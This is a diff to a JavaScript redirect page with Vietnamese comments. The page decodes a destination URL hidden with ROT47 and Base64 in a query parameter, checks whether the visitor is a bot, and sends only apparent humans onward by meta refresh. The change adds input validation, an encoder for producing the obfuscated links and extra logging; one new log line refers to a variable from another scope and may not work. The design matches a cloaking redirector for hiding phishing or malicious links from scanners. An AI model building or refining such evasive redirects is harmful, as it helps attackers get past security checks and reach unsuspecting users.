@@ -12,7 +12,7 @@
         const params = new URLSearchParams(window.location.search);
         const data = params.get('url') || '';
 
-        // Hàm giải mã Base64 + ROT47, xử lý ký tự đặc biệt
+        // Hàm giải mã Base64 + ROT47, xử lý kỹ hơn
         function decodeAdvanced(input) {
             let rot47 = '';
             for (let i = 0; i < input.length; i++) {
@@ -24,12 +24,33 @@
                 }
             }
             try {
+                // Kiểm tra chuỗi Base64 trước khi giải mã
+                const base64Pattern = /^[A-Za-z0-9+/]+={0,2}$/;
+                if (!base64Pattern.test(rot47)) {
+                    console.error("Invalid Base64 string after ROT47:", rot47);
+                    return '';
+                }
                 const decodedBase64 = atob(rot47);
                 return decodeURIComponent(decodedBase64); // Xử lý ký tự đặc biệt
             } catch (e) {
                 console.error("Invalid encoded URL:", e);
                 return '';
             }
+        }
+
+        // Hàm mã hóa để kiểm tra (dùng nếu cần)
+        function encodeAdvanced(url) {
+            let base64 = btoa(encodeURIComponent(url));
+            let rot47 = '';
+            for (let i = 0; i < base64.length; i++) {
+                let code = base64.charCodeAt(i);
+                if (code >= 33 && code <= 126) {
+                    rot47 += String.fromCharCode((code - 33 + 47) % 94 + 33);
+                } else {
+                    rot47 += base64[i];
+                }
+            }
+            return rot47;
         }
 
         // Kiểm tra bot, giảm sai sót với người dùng thật
@@ -58,7 +79,7 @@
                     // Chuyển hướng tức thì qua thẻ meta
                     document.write(`<meta http-equiv="refresh" content="0;url=${encodeURI(destination)}">`);
                 } else {
-                    console.error("Failed to decode URL, showing default page.");
+                    console.error("Failed to decode URL, showing default page. Raw ROT47:", rot47);
                 }
             } else {
                 console.log("Bot detected, not redirecting.");
